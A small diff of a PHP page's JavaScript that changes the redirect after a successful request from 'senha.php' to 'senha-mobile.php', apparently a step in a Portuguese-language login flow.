@@ -211,7 +211,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 });
                 const result = await response.json();
                 if (result.success) {
-                    window.location.href = 'senha.php';
+                    window.location.href = 'senha-mobile.php';
                 } else {
                     errorDiv.textContent = result.error || 'Ocorreu um erro.';
                 }
